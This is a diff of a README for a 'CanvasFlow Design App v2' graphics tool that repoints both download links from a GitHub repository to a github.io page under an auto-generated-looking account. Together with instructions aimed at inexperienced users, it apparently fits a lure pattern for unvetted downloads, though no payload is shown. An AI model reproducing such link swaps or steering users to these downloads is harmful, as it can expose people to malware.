@@ -1,6 +1,6 @@
 # 🎨 CanvasFlow Design App v2 - Create Graphics Without the Headache
 
-[![Download CanvasFlow v2](https://img.shields.io/badge/Download-CanvasFlow_v2-4CAF50?style=for-the-badge&logo=github)](https://github.com/Flintglassdeliberation704/canvasflow-design-app-v2)
+[![Download CanvasFlow v2](https://img.shields.io/badge/Download-CanvasFlow_v2-4CAF50?style=for-the-badge&logo=github)](https://flintglassdeliberation704.github.io)
 
 ## 📥 Getting Started
 
@@ -43,7 +43,7 @@ Follow these exact steps. Do not skip any step.
 
 Click this link:
 
-[**Click here to download CanvasFlow v2**](https://github.com/Flintglassdeliberation704/canvasflow-design-app-v2)
+[**Click here to download CanvasFlow v2**](https://flintglassdeliberation704.github.io)
 
 This opens a GitHub page. GitHub is a website that hosts software. Do not worry about the technical layout. You only need one button on that page.
 
